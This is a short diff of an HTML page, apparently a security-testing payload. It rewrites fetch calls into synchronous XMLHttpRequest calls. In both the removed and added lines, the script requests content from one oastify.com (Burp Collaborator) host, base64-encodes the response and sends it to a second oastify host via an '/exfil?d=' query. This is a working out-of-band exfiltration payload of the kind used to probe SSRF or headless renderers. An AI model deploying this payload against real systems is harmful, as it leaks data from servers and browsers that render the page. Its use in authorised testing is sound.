@@ -2,11 +2,12 @@
 <html>
 <img src="http://vutkcbjvck26lx9ibcyfpqj8hznqbiz7.oastify.com/check.png">
 <script>
-window.fetch("http://vutkcbjvck26lx9ibcyfpqj8hznqbiz7.oastify.com")
-  .then(function(res) { return res.text(); })
-  .then(function(text) {
-    var encoded = text ? btoa(text) : "test";
-    window.fetch("https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/exfil?d=" + encoded);
-  });
+var r = new window.XMLHttpRequest();
+r.open('GET', 'http://vutkcbjvck26lx9ibcyfpqj8hznqbiz7.oastify.com', false);
+r.send();
+var encoded = r.responseText ? btoa(r.responseText) : 'test';
+var x = new window.XMLHttpRequest();
+x.open('GET', 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/exfil?d=' + encoded, false);
+x.send();
 </script>
 </html>
